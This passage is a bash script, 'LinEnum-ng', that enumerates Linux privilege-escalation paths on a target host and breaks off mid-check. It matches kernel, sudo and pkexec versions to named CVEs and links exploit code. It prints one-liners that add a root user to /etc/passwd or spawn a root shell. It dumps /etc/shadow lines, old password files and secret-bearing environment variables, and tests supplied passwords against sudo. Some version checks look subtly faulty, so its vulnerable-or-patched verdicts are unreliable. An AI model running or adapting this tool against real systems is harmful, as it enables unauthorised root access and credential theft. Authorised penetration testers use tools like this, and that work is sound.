#!/bin/bash

# Color codes
CYAN="\033[0;36m"
RED="\033[0;31m"
LRED="\033[1;31m"
GREEN="\033[0;32m"
LBLUE="\033[1;34m"
LMAGENTA="\033[1;35m"
YELLOW="\033[0;33m"
# Banner's
BOLD='\033[1m'
BGREEN='\033[38;5;46m'
NC="\033[0m"
WHITE='\033[38;5;231m'



# Banner
echo -e "${WHITE}"
echo "                                           ▃▄▅█████████▅▄▃"
echo "                                        ▁▂▇███████████████▇▂▁"
echo "                                       ▃▆███████████████████▆▃"
echo "                                       ▄█▆▁▁▁▃▇███████▇▃▁▁▁██▅"
echo "                                      ▅▇▆  ▅▆▄▂███████▃▄▆▆ ▃▇█▅"
echo "                                      ▇█▆  ▄▄▃▁██▃▄███▃▄▆▇  ▆█▆"
echo "                                      ▇█▆    ▂▅▄▂▁▁▄██▆▂▁▁ ▂▆█▆"
echo "                                      ▇██▅▁▁  ▁▃▆▃▃▆█▃▁  ▁▆▇██▆"
echo "                                     ▄█████▅▂    ▃▅▄   ▂▅▇████▇▄"
echo "                                   ▁▂███████▇▆▆▆▆▆▆▆▆▆▆▇████████▂▁"
echo "                                  ▂▅███████▄▂          ▂▃▄███████▆▃"
echo "                                 ▂▅██████▅                ▃▅██████▆▂"
echo "                                ▁▆██████▅                  ▁▅██████▆▂"
echo "                                ▇██████▄                     ▄███████"
echo "                              ▁███████▃▁                     ▁▃███████▁"
echo "                             ▂▆██████▃▁                       ▂▃██████▆▂"
echo "                             ▃███████▁                         ▁███████▃"
echo "                            ▃██████▇▁                           ████████▄"
echo "                            ▄██████▇                            ████████▄"
echo "                            ▄█████▅▂                            ▅▇██████▄"
echo -e "                            ▄█████▅      ${BGREEN}${BOLD}LinEnum-ng: ${WHITE}1.0.0${NC}${WHITE}       ▇██████▄"
echo -e "                            ▄█████▅     ${BGREEN}${BOLD}Developed by: ${WHITE}Strikoder${NC}${WHITE}  ▇██████▄"
echo "                            ▄█████▅                              ▇██████▄"
echo "                            ▄█████▅                              ▇██████▄"
echo "                            ▄███▅▇▅                              ▇█▅▁███▄"
echo "                            ▁▃▆▆▁▆▅                             ▃▇█▅▁▆▆▃▁"
echo "                                 ▂▄▅                            ██▅▂"
echo "                                  ▄█                           ▁██▄"
echo "                                  ▁▂▇▁                       ▃▅▇█▃▁"
echo "                                   ▁▄▅▂▁                    ▁▃▆█▃▁"
echo "                                     ▅█▆▄▃ ▃▄▄▁▃▃▁▁▂▄▄▇▇▆▇▄▄▇██▅"
echo "                                     ▂▄▆▆▂▄▇▇▇▇██▇▇▇███▇▅▂▆██▇▄▂"
echo "                                   ▁▅▄▄▅▄  ▁▅█████████▅▂ ▁ ▄▇▇▅█▅▂"
echo "                                  ▄█▄▃▇█▇▄▇█▆▆████████▄▄▅█▃▃▇█████▅▃▃"
echo "                                  ▁▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▂▂▂"
echo -e "${NC}"

echo -e "\033[1;31;103mPrivilege Escalation Vector\033[0m"

# ============================================================================
# ARGUMENT PARSING
# ============================================================================
PASSWORD=""
USERNAME=""

# Handle --help before getopts (getopts doesn't support long options)
for arg in "$@"; do
    if [ "$arg" = "--help" ] || [ "$arg" = "-h" ]; then
        echo -e "${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${LBLUE}║ LinEnum-ng — Usage & Help                                 ║${NC}"
        echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo -e ""
        echo -e "${WHITE}Usage:${NC}"
        echo -e "    ${CYAN}$0 [OPTIONS]${NC}"
        echo -e ""
        echo -e "${WHITE}Options:${NC}"
        echo -e "    ${CYAN}-p PASSWORD${NC}    Supply a known password to test sudo access with credentials."
        echo -e "                   Without this, only passwordless sudo is checked."
        echo -e ""
        echo -e "    ${CYAN}-u USERNAME${NC}    Target a specific username to hunt across the filesystem."
        echo -e "                   Searches for files named after the user and files"
        echo -e "                   containing the username in their content."
        echo -e ""
        echo -e "    ${CYAN}-h, --help${NC}     Show this help message and exit."
        echo -e ""
        echo -e "${WHITE}Examples:${NC}"
        echo -e "    ${CYAN}$0${NC}"
        echo -e "    ${YELLOW}    Run a full enumeration with no credentials (passwordless only).${NC}"
        echo -e ""
        echo -e "    ${CYAN}$0 -p 'Summer2024!'${NC}"
        echo -e "    ${YELLOW}    Run enumeration and test sudo access using the provided password.${NC}"
        echo -e ""
        echo -e "    ${CYAN}$0 -u john${NC}"
        echo -e "    ${YELLOW}    Run enumeration and hunt all files related to user 'john'.${NC}"
        echo -e ""
        echo -e "    ${CYAN}$0 -p 'Summer2024!' -u john${NC}"
        echo -e "    ${YELLOW}    Full run: test sudo with password AND hunt files for user 'john'.${NC}"
        echo -e "    ${YELLOW}    Useful after finding credentials during an engagement.${NC}"
        echo -e ""
        echo -e "    ${CYAN}$0 -p 'rockyou' -u admin${NC}"
        echo -e "    ${YELLOW}    Check if 'rockyou' grants sudo rights, and search for 'admin' artifacts.${NC}"
        echo -e ""
        exit 0
    fi
done

while getopts ":p:u:" opt; do
    case $opt in
        p)
            PASSWORD="$OPTARG"
            ;;
        u)
            USERNAME="$OPTARG"
            ;;
        \?)
            echo -e "${RED}[-] Invalid option: -$OPTARG${NC}" >&2
            echo -e "${YELLOW}    Run '$0 --help' for usage information.${NC}" >&2
            ;;
        :)
            echo -e "${RED}[-] Option -$OPTARG requires an argument.${NC}" >&2
            echo -e "${YELLOW}    Run '$0 --help' for usage information.${NC}" >&2
            ;;
    esac
done

if [ -n "$PASSWORD" ]; then
    echo -e "\n${LMAGENTA}[*] Password provided via -p — will use for sudo -l check${NC}"
else
    echo -e "\n${YELLOW}[*] No password provided. Tip: run with -p '<password>' to also check sudo with credentials.${NC}"
fi

if [ -n "$USERNAME" ]; then
    echo -e "${LMAGENTA}[*] Username target: ${WHITE}$USERNAME${NC}${LMAGENTA} — will hunt files by name and content${NC}"
fi

# ============================================================================
# BASIC SYSTEM INFO
# ============================================================================
echo -e "${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ BASIC SYSTEM INFORMATION                                  ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Current user and groups:"
id 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Hostname:"
hostname 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Kernel version (check manually for exploits):"
uname -r
kernel_version=$(uname -r)

echo -e "\n${YELLOW}[+] ${NC}Full system information:"
uname -a 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}OS Release:"
cat /etc/os-release 2>/dev/null | grep PRETTY_NAME

echo -e "\n${YELLOW}[+] ${NC}Current shell:"
echo $SHELL

echo -e "\n${YELLOW}[+] ${NC}Uptime:"
uptime 2>/dev/null | sed 's/^ *//'

# ============================================================================
# KERNEL EXPLOIT CHECK
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ KERNEL EXPLOIT VULNERABILITY CHECK                        ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

# Extract kernel version components
kernel_base=$(echo $kernel_version | cut -d '-' -f1)
ver1=$(echo $kernel_base | cut -d '.' -f1)
ver2=$(echo $kernel_base | cut -d '.' -f2)
ver3=$(echo $kernel_base | cut -d '.' -f3)

echo -e "\n${YELLOW}[+] ${NC}Parsed kernel version: $ver1.$ver2.$ver3"

# Check for PwnKit (CVE-2021-4034)
echo -e "\n${YELLOW}[+] ${NC}Checking for PwnKit (CVE-2021-4034) [pkexec < 0.120]:"
if [ -f /usr/bin/pkexec ]; then
    pkexec_perms=$(ls -l /usr/bin/pkexec 2>/dev/null)
    echo -e "pkexec found: ${CYAN}$pkexec_perms${NC}"

    if [ -u /usr/bin/pkexec ]; then
        echo -e "${CYAN}pkexec has SUID bit set${NC}"
        pkexec_version=$(/usr/bin/pkexec --version 2>&1 | grep -o '[0-9][0-9]*\.[0-9][0-9]*' | head -1)

        if [ ! -z "$pkexec_version" ]; then
            echo -e "pkexec version: ${CYAN}$pkexec_version${NC}"

            if awk "BEGIN {exit !($pkexec_version < 0.120)}"; then
                echo -e "\033[1;31;103mVulnerable pkexec version $pkexec_version (< 0.120) - CVE-2021-4034\033[0m"
                echo -e "${LMAGENTA}Exploit: https://gist.github.com/strikoder/c540a4babb01307960dd6a30f822077c${NC}"
                echo -e "${LMAGENTA}Exploit without gcc: https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py${NC}"

            else
                echo -e "${GREEN}Not vulnerable (pkexec >= 0.120)${NC}"
            fi
        else
            echo -e "${YELLOW}Could not determine pkexec version, checking manually recommended${NC}"
        fi
    else
        echo -e "${GREEN}pkexec does NOT have SUID bit set${NC}"
    fi
else
    echo -e "${GREEN}pkexec not found${NC}"
fi

# Check for Dirty Pipe (CVE-2022-0847)
echo -e "\n${YELLOW}[+] ${NC}Checking for Dirty Pipe (CVE-2022-0847) [kernel >= 5.8 & kernel < 5.16.10]:"
if (( ${ver1:-0} < 5 )) || (( ${ver1:-0} > 5 )); then
    echo -e "${GREEN}Not vulnerable (kernel < 5.8 or > 5.16.10)${NC}"
elif (( ${ver1:-0} == 5 && ${ver2:-0} < 8 )); then
    echo -e "${GREEN}Not vulnerable (kernel < 5.8)${NC}"
elif (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 102 )) || \
     (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 92 )) || \
     (( ${ver1:-0} == 5 && ${ver2:-0} == 15 && ${ver3:-0} == 25 )) || \
     (( ${ver1:-0} == 5 && ${ver2:-0} >= 16 && ${ver3:-0} >= 11 )) || \
     (( ${ver1:-0} == 5 && ${ver2:-0} > 16 )); then
    echo -e "${GREEN}Not vulnerable (patched version)${NC}"
else
    echo -e "\033[1;31;103mVulnerable to Dirty Pipe - Kernel 5.8 - 5.16.10 (unpatched)\033[0m"
    echo -e "${LMAGENTA}Exploit: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit${NC}"
fi

# Check for CVE-2017-16995 (eBPF)
echo -e "\n${YELLOW}[+] ${NC}Checking for CVE-2017-16995 (eBPF privilege escalation):"
if [[ "$kernel_version" == "4.4.0-116"* ]]; then
    echo -e "\033[1;31;103mVulnerable kernel 4.4.0-116 - CVE-2017-16995\033[0m"
    echo -e "${LMAGENTA}Exploit: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45010.tar${NC}"
else
    echo -e "${GREEN}Not the specific vulnerable version (4.4.0-116)${NC}"
fi

# Check for Dirty COW (CVE-2016-5195)
echo -e "\n${YELLOW}[+] ${NC}Checking for Dirty COW (CVE-2016-5195) [kernel <= 3.19.0-73.8]:"
if (( ${ver1:-0} < 3 )) || (( ${ver1:-0} == 3 && ${ver2:-0} < 19 )); then
    echo -e "\033[1;31;103mLikely vulnerable - Kernel < 3.19 - Dirty COW\033[0m"
    echo -e "${LMAGENTA}Exploit: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs${NC}"
    echo -e "${LMAGENTA}Must compile on target: gcc -pthread dirty.c -o dirty -lcrypt${NC}"
elif (( ${ver1:-0} == 3 && ${ver2:-0} == 19 && ${ver3:-0} <= 73 )); then
    echo -e "\033[1;31;103mVulnerable kernel 3.19.0-73.8 or lower - Dirty COW\033[0m"
    echo -e "${LMAGENTA}Exploit: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs${NC}"
    echo -e "${LMAGENTA}Must compile on target: gcc -pthread dirty.c -o dirty -lcrypt${NC}"
elif (( ${ver1:-0} == 4 && ${ver2:-0} < 8 )) || (( ${ver1:-0} == 3 )); then
    echo -e "\033[1;31;103mPossibly vulnerable - Check patch level - Dirty COW\033[0m"
    echo -e "${LMAGENTA}Kernels before 4.8.3, 4.7.9, 4.4.26 are vulnerable${NC}"
else
    echo -e "${GREEN}Not vulnerable (kernel too new)${NC}"
fi

# Check for Baron Samedit (CVE-2021-3156)
echo -e "\n${YELLOW}[+] ${NC}Checking for Baron Samedit (CVE-2021-3156) [sudo < 1.8.21p2 or 1.9.0-1.9.5p1]:"
sudo_version=$(sudo -V | head -1 | cut -d " " -f3)
if [ ! -z "$sudo_version" ]; then
    echo -e "Current sudo version: ${CYAN}$sudo_version${NC}"

    # Check SUID bit on sudoedit
    if [ -u /usr/bin/sudoedit ]; then
        echo -e "${CYAN}/usr/bin/sudoedit has SUID bit set${NC}"
        ls -l /usr/bin/sudoedit
    else
        echo -e "${GREEN}/usr/bin/sudoedit does NOT have SUID bit${NC}"
    fi

    # Quick vulnerability test
    echo -e "\n${YELLOW}Testing for vulnerability...${NC}"
    sudoedit_test=$(sudoedit -s / 2>&1)
    if echo "$sudoedit_test" | grep -q "sudoedit:.*not a regular file"; then
        echo -e "\033[1;31;103mVulnerable to Baron Samedit - CVE-2021-3156\033[0m"
        echo -e "${LMAGENTA}Exploit: https://github.com/blasty/CVE-2021-3156${NC}"
    elif echo "$sudoedit_test" | grep -q "usage:"; then
        echo -e "${GREEN}Not vulnerable (patched)${NC}"
    else
        echo -e "${YELLOW}Uncertain, manual verification needed${NC}"
    fi
else
    echo -e "${GREEN}sudo not found or not accessible${NC}"
fi

# Check for Copy Fail (CVE-2026-31431)
echo -e "\n${YELLOW}[+] ${NC}Checking for Copy Fail (CVE-2026-31431) [kernel 4.14 - 6.18.21]:"
AEAD=$(grep -c authencesn /proc/crypto 2>/dev/null)
SUID=$(find /usr/bin/su -perm -4000 2>/dev/null | wc -l)
SPLICE=$(python3 -c "import os; os.splice; print(1)" 2>/dev/null)
if [ "$AEAD" -gt 0 ] && [ "$SUID" -gt 0 ] && [ "$SPLICE" = "1" ]; then
    echo -e "\033[1;31;103mVulnerable to Copy Fail - CVE-2026-31431\033[0m"
    echo -e "${LMAGENTA}PoC: https://github.com/theori-io/copy-fail-CVE-2026-31431${NC}"
    echo -e "${LMAGENTA}Fix: echo 'install algif_aead /bin/false' > /etc/modprobe.d/disable-algif-aead.conf && rmmod algif_aead 2>/dev/null${NC}"
else
    echo -e "${GREEN}Not vulnerable (conditions not met)${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Checking for compilers (kernel exploit compilation):"
for compiler in gcc cc g++ python python3 perl ruby make; do
    path=$(which $compiler 2>/dev/null)
    [ -n "$path" ] && echo -e "$compiler found at $path"
done

# ============================================================================
# USER/GROUP INFORMATION
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ USER/GROUP INFORMATION                                    ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Users with login shells:"
grep -E "(/bin/bash|/bin/sh|/bin/zsh)" /etc/passwd 2>/dev/null | cut -d: -f1,7 | while read user; do
    echo -e "${CYAN}$user${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}All users and their groups:"
for usr in $(cut -d":" -f1 /etc/passwd 2>/dev/null | grep -vE "^(daemon|news|proxy|_apt|lp|uucp|dhcpcd)$"); do
    id $usr 2>/dev/null
done

echo -e "\n${YELLOW}[+] ${NC}Users in admin/privileged groups:"
for group in sudo wheel admin docker lxd shadow; do
    members=$(grep "^$group:" /etc/group 2>/dev/null | cut -d: -f4)
    if [ ! -z "$members" ]; then
        echo -e "${LRED}$group: $members${NC}"
    fi
done

echo -e "\n${YELLOW}[+] ${NC}Super user accounts (uid 0):"
awk -F: '$3 == 0 {print $1}' /etc/passwd 2>/dev/null | while read superuser; do
    echo -e "${LRED}$superuser${NC}"
done

echo -e "\n${YELLOW}[+] ${NC}Users logged in:"
who 2>/dev/null
w 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Last logged users:"
lastlog 2>/dev/null | grep -v "Never" | head -10

echo -e "\n${YELLOW}[+] ${NC}/etc/passwd permissions:"
ls -lah /etc/passwd 2>/dev/null
if [ -w /etc/passwd ]; then
    echo -e "\033[1;31;103m/etc/passwd is WRITABLE! Can add root user!\033[0m"
    echo -e "${LMAGENTA}Exploit: pw=\$(openssl passwd -1 Password123); echo \"r00t:\$pw:0:0:root:/root:/bin/bash\" >> /etc/passwd${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}/etc/shadow permissions:"
ls -lah /etc/shadow 2>/dev/null
if [ -r /etc/shadow ]; then
    echo -e "\033[1;31;103m/etc/shadow is READABLE! Password hashes exposed!\033[0m"
    echo -e "${YELLOW}[+] ${NC}Shadow file contents (first 5 lines):"
    head -5 /etc/shadow 2>/dev/null
fi
if [ -w /etc/shadow ]; then
    echo -e "\033[1;31;103m/etc/shadow is WRITABLE!\033[0m"
fi

echo -e "\n${YELLOW}[+] ${NC}Checking for password hashes in /etc/passwd:"
hashesinpasswd=$(grep -v '^[^:]*:[x*]' /etc/passwd 2>/dev/null)
if [ "$hashesinpasswd" ]; then
    echo -e "\033[1;31;103mPassword hashes found in /etc/passwd!\033[0m"
    echo -e "${CYAN}$hashesinpasswd${NC}"
else
    echo -e "${GREEN}No hashes in /etc/passwd${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Sudoers configuration:"
if [ -r /etc/sudoers ]; then
    grep -v -e '^$' -e '^#' /etc/sudoers 2>/dev/null
else
    echo -e "${GREEN}Cannot read /etc/sudoers${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Sudo version:"
sudo_version=$(sudo -V 2>/dev/null | head -1)
if [ "$sudo_version" ]; then
    echo -e "${CYAN}$sudo_version${NC}"

    # Extract version number
    sudo_ver_num=$(echo "$sudo_version" | grep -oP 'version \K[0-9]+\.[0-9]+\.[0-9]+')

    # Check for known vulnerable sudo versions
    echo -e "\n${YELLOW}[+] ${NC}Checking for known vulnerable sudo versions:"

    if [[ "$sudo_ver_num" == "1.8.23" ]]; then
        echo -e "\033[1;31;103mVulnerable Sudo 1.8.23 (PwnKit-related)\033[0m"
    fi

    if [[ "$sudo_ver_num" < "1.8.26" ]]; then
        echo -e "\033[1;31;103mCVE-2019-18634 (pwfeedback buffer overflow)\033[0m"
        echo -e "${LMAGENTA}Check if pwfeedback is enabled:${NC}"
        echo -e "${CYAN}sudo -l  # If you see asterisks (****) when typing, it's vulnerable${NC}"
        echo -e "${CYAN}Exploit: https://github.com/saleemrashid/sudo-cve-2019-18634${NC}"
    fi

    if [[ "$sudo_ver_num" < "1.8.28" ]]; then
        echo -e "\033[1;31;103mSudo < 1.8.28 (User ID bypass)\033[0m"
        echo -e "${LMAGENTA}Exploitation:${NC}"
        echo -e "${CYAN}sudo -u#-1 /bin/bash${NC}"
    fi

    if [[ "$sudo_ver_num" == "1.8.31" ]]; then
        echo -e "\033[1;31;103mCVE-2023-3560 (Policy bypass)\033[0m"
        echo -e "${LMAGENTA}Exploit: https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit${NC}"
    fi

    # Check for CVE-2025-32463 (sudo 1.9.14 - 1.9.17)
    sudo_major=$(echo "$sudo_ver_num" | cut -d. -f1)
    sudo_minor=$(echo "$sudo_ver_num" | cut -d. -f2)
    sudo_patch=$(echo "$sudo_ver_num" | cut -d. -f3)

    if [[ "$sudo_major" == "1" ]] && [[ "$sudo_minor" == "9" ]]; then
        if [[ "$sudo_patch" -ge 14 ]] && [[ "$sudo_patch" -le 17 ]]; then
            echo -e "\033[1;31;103mCVE-2025-32463 (Sudo 1.9.14-1.9.17 NSS privilege escalation)\033[0m"
            echo -e "${LMAGENTA}Exploit: https://gist.github.com/strikoder/439dab5928787b6dbd5bf990da9cf524${NC}"
        fi
    fi
else
    echo -e "${GREEN}sudo not available${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Can we sudo without password?"
sudo_nopass=$(echo '' | sudo -S -l -k 2>/dev/null)
if [ "$sudo_nopass" ]; then
    echo -e "${RED}$sudo_nopass${NC}"
    echo -e "\n${YELLOW}[+] ${NC}Checking for exploitable sudo binaries:"

    # Extract only the actual command paths
    exploitable=$(echo "$sudo_nopass" | grep -E '^\s+\(' | awk '{print $NF}' | xargs -n 1 basename 2>/dev/null | grep -wE '7z|aa-exec|ab|alpine|ansible-playbook|ansible-test|aoss|apache2ctl|apt-get|apt|ar|aria2c|arj|arp|as|ascii-xfr|ascii85|ash|aspell|at|atobm|awk|aws|base32|base58|base64|basenc|basez|bash|batcat|bc|bconsole|bpftrace|bridge|bundle|bundler|busctl|busybox|byebug|bzip2|c89|c99|cabal|capsh|cat|cdist|certbot|check_by_ssh|check_cups|check_log|check_memory|check_raid|check_ssl_cert|check_statusfile|chmod|choom|chown|chroot|clamscan|cmp|cobc|column|comm|composer|cowsay|cowthink|cp|cpan|cpio|cpulimit|crash|crontab|csh|csplit|csvtool|cupsfilter|curl|cut|dash|date|dc|dd|debugfs|dialog|diff|dig|distcc|dmesg|dmidecode|dmsetup|dnf|docker|dosbox|dotnet|dpkg|dstat|dvips|easy_install|eb|ed|efax|elvish|emacs|enscript|env|eqn|espeak|ex|exiftool|expand|expect|facter|file|find|fish|flock|fmt|fold|fping|ftp|gawk|gcc|gcloud|gcore|gdb|gem|genie|genisoimage|ghc|ghci|gimp|ginsh|git|grc|grep|gtester|gzip|hd|head|hexdump|highlight|hping3|iconv|iftop|install|ionice|ip|irb|ispell|jjs|joe|join|journalctl|jq|jrunscript|jtag|julia|knife|ksh|ksshell|ksu|kubectl|latex|latexmk|ld\.so|ldconfig|less|lftp|links|ln|loginctl|logsave|look|ltrace|lua|lualatex|luatex|lwp-download|lwp-request|mail|make|man|mawk|minicom|more|mosquitto|mount|msfconsole|msgattrib|msgcat|msgconv|msgfilter|msgmerge|msguniq|mtr|multitime|mv|mysql|nano|nasm|nawk|nc|ncdu|ncftp|neofetch|nft|nice|nl|nm|nmap|node|nohup|npm|nroff|nsenter|ntpdate|octave|od|openssl|openvpn|openvt|opkg|pandoc|paste|pdb|pdflatex|pdftex|perf|perl|perlbug|pexec|pg|php|pic|pico|pidstat|pip|pkexec|pkg|posh|pr|pry|psftp|psql|ptx|puppet|pwsh|python|rake|rc|readelf|red|redcarpet|restic|rev|rlwrap|rpm|rpmdb|rpmquery|rpmverify|rsync|ruby|run-mailcap|run-parts|runscript|rview|rvim|sash|scanmem|scp|screen|script|scrot|sed|service|setarch|setfacl|setlock|sftp|sg|shuf|slsh|smbclient|snap|socat|soelim|softlimit|sort|split|sqlite3|sqlmap|ss|ssh-agent|ssh-keygen|ssh-keyscan|ssh|sshpass|start-stop-daemon|stdbuf|strace|strings|su|sudo|sysctl|systemctl|systemd-resolve|tac|tail|tar|task|taskset|tasksh|tbl|tclsh|tcpdump|tdbtool|tee|telnet|terraform|tex|tftp|tic|time|timedatectl|timeout|tmate|tmux|top|torify|torsocks|troff|ul|unexpand|uniq|unshare|unsquashfs|unzip|update-alternatives|uudecode|uuencode|vagrant|valgrind|varnishncsa|vi|view|vigr|vim|vimdiff|vipw|virsh|w3m|wall|watch|wc|wget|whiptail|wireshark|wish|xargs|xdg-user-dir|xdotool|xelatex|xetex|xmodmap|xmore|xpad|xxd|xz|yarn|yash|yum|zathura|zip|zsh|zsoelim|zypper' 2>/dev/null)

    if [ "$exploitable" ]; then
        echo -e "\033[1;31;103mEXPLOITABLE SUDO BINARIES FOUND\033[0m"
        while IFS= read -r binary; do
            echo -e "    ${LMAGENTA}$binary${NC}"
        done <<< "$exploitable"
    else
        echo -e "${GREEN}None found${NC}"
    fi
else
    echo -e "${GREEN}sudo not available${NC}"
    
fi

echo -e "\n${YELLOW}[+] ${NC}Checking sudo privileges with provided password (-p):"
if [ -n "$PASSWORD" ]; then
    sudo_withpass=$(echo "$PASSWORD" | sudo -S -l -k 2>/dev/null)
    if [ "$sudo_withpass" ]; then
        echo -e "\033[1;31;103msudo -l succeeded with provided password!\033[0m"
        echo -e "${RED}$sudo_withpass${NC}"

        echo -e "\n${YELLOW}[+] ${NC}Checking for exploitable sudo binaries (with password):"
        exploitable_p=$(echo "$sudo_withpass" | grep -E '^\s+\(' | awk '{print $NF}' | xargs -n 1 basename 2>/dev/null | grep -wE '7z|aa-exec|ab|alpine|ansible-playbook|ansible-test|aoss|apache2ctl|apt-get|apt|ar|aria2c|arj|arp|as|ascii-xfr|ascii85|ash|aspell|at|atobm|awk|aws|base32|base58|base64|basenc|basez|bash|batcat|bc|bconsole|bpftrace|bridge|bundle|bundler|busctl|busybox|byebug|bzip2|c89|c99|cabal|capsh|cat|cdist|certbot|check_by_ssh|check_cups|check_log|check_memory|check_raid|check_ssl_cert|check_statusfile|chmod|choom|chown|chroot|clamscan|cmp|cobc|column|comm|composer|cowsay|cowthink|cp|cpan|cpio|cpulimit|crash|crontab|csh|csplit|csvtool|cupsfilter|curl|cut|dash|date|dc|dd|debugfs|dialog|diff|dig|distcc|dmesg|dmidecode|dmsetup|dnf|docker|dosbox|dotnet|dpkg|dstat|dvips|easy_install|eb|ed|efax|elvish|emacs|enscript|env|eqn|espeak|ex|exiftool|expand|expect|facter|file|find|fish|flock|fmt|fold|fping|ftp|gawk|gcc|gcloud|gcore|gdb|gem|genie|genisoimage|ghc|ghci|gimp|ginsh|git|grc|grep|gtester|gzip|hd|head|hexdump|highlight|hping3|iconv|iftop|install|ionice|ip|irb|ispell|jjs|joe|join|journalctl|jq|jrunscript|jtag|julia|knife|ksh|ksshell|ksu|kubectl|latex|latexmk|ld\.so|ldconfig|less|lftp|links|ln|loginctl|logsave|look|ltrace|lua|lualatex|luatex|lwp-download|lwp-request|mail|make|man|mawk|minicom|more|mosquitto|mount|msfconsole|msgattrib|msgcat|msgconv|msgfilter|msgmerge|msguniq|mtr|multitime|mv|mysql|nano|nasm|nawk|nc|ncdu|ncftp|neofetch|nft|nice|nl|nm|nmap|node|nohup|npm|nroff|nsenter|ntpdate|octave|od|openssl|openvpn|openvt|opkg|pandoc|paste|pdb|pdflatex|pdftex|perf|perl|perlbug|pexec|pg|php|pic|pico|pidstat|pip|pkexec|pkg|posh|pr|pry|psftp|psql|ptx|puppet|pwsh|python|rake|rc|readelf|red|redcarpet|restic|rev|rlwrap|rpm|rpmdb|rpmquery|rpmverify|rsync|ruby|run-mailcap|run-parts|runscript|rview|rvim|sash|scanmem|scp|screen|script|scrot|sed|service|setarch|setfacl|setlock|sftp|sg|shuf|slsh|smbclient|snap|socat|soelim|softlimit|sort|split|sqlite3|sqlmap|ss|ssh-agent|ssh-keygen|ssh-keyscan|ssh|sshpass|start-stop-daemon|stdbuf|strace|strings|su|sudo|sysctl|systemctl|systemd-resolve|tac|tail|tar|task|taskset|tasksh|tbl|tclsh|tcpdump|tdbtool|tee|telnet|terraform|tex|tftp|tic|time|timedatectl|timeout|tmate|tmux|top|torify|torsocks|troff|ul|unexpand|uniq|unshare|unsquashfs|unzip|update-alternatives|uudecode|uuencode|vagrant|valgrind|varnishncsa|vi|view|vigr|vim|vimdiff|vipw|virsh|w3m|wall|watch|wc|wget|whiptail|wireshark|wish|xargs|xdg-user-dir|xdotool|xelatex|xetex|xmodmap|xmore|xpad|xxd|xz|yarn|yash|yum|zathura|zip|zsh|zsoelim|zypper' 2>/dev/null)
        if [ "$exploitable_p" ]; then
            echo -e "\033[1;31;103mEXPLOITABLE SUDO BINARIES FOUND (with password)\033[0m"
            while IFS= read -r binary; do
                echo -e "    ${LMAGENTA}$binary${NC}"
            done <<< "$exploitable_p"
        else
            echo -e "${GREEN}None found${NC}"
        fi
    else
        echo -e "${GREEN}sudo -l failed with provided password (wrong password or sudo not configured)${NC}"
    fi
else
    echo -e "${YELLOW}Skipped — no password provided (-p)${NC}"
fi

# ============================================================================
# ENVIRONMENTAL INFORMATION
# ============================================================================
echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${LBLUE}║ ENVIRONMENTAL INFORMATION                                 ║${NC}"
echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[+] ${NC}Environment variables (filtered for sensitive):"
(env 2>/dev/null || set 2>/dev/null) | grep -i "pass\|pwd\|key\|secret\|token\|api" --color=always

echo -e "\n${YELLOW}[+] ${NC}PATH variable:"
echo -e "${CYAN}$PATH${NC}"

echo -e "\n${YELLOW}[+] ${NC}PATH directory permissions (checking for writable):"
for dir in $(echo $PATH | tr ":" " "); do
    if [ -d "$dir" ]; then
        perm=$(ls -ld "$dir" 2>/dev/null)
        if [ -w "$dir" ]; then
            echo -e "${LRED}[WRITABLE!] $perm${NC}"
        else
            echo -e "${GREEN}$perm${NC}"
        fi
    fi
done

echo -e "\n${YELLOW}[+] ${NC}Available shells:"
cat /etc/shells 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Current umask:"
umask -S 2>/dev/null
umask 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Password policy (from /etc/login.defs):"
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}SELinux status:"
sestatus 2>/dev/null || echo -e "${GREEN}SELinux not present${NC}"

echo -e "\n${YELLOW}[+] ${NC}Checking for old passwords:"
if [ -r /etc/security/opasswd ]; then
    echo -e "\033[1;31;103mOld passwords file is readable\033[0m"

    cat /etc/security/opasswd 2>/dev/null
else
    echo -e "${GREEN}Cannot read opasswd file${NC}"
fi

echo -e "\n${YELLOW}[+] ${NC}Home directory permissions:"
ls -lah /home 2>/dev/null

echo -e "\n${YELLOW}[+] ${NC}Can we read root's home?"
if [ -r /root ]; then
    echo -e "\033[1;31;103m/root is readable!\033[0m"

